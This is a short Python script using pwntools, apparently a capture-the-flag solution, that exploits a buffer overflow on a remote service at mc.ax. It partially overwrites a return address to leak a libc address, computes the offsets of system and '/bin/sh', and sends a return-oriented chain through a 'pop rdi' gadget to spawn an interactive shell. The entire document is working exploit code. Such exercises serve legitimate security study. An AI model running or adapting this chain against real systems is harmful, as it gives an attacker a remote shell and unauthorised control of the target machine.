#!/usr/bin/env  python3

import pwn
import struct

proc = pwn.remote("mc.ax", 31081)

def int2byte(num):
	return struct.pack(b"<Q", num)

payload = b"A" * 34
proc.send(payload + b"\x03")			# overwrite address with main function
										# caller instruction

data = proc.recvuntil(b"\x7f\n")		# reads address of libc_start_main

_libc_start_main_main = struct.unpack(b"<Q", data[-7:-1] + b"\x00\x00")[0]

binsh = _libc_start_main_main+1455183		# offset of /bin/sh
system = _libc_start_main_main+139597		# offset of system

gadget_pop_rdi = int2byte(0x0000000000401313)		# gadget "pop rdi"

payload += gadget_pop_rdi
payload += int2byte(binsh)
payload += int2byte(system)

proc.send(payload)
proc.recv()

proc.interactive()
proc.close()
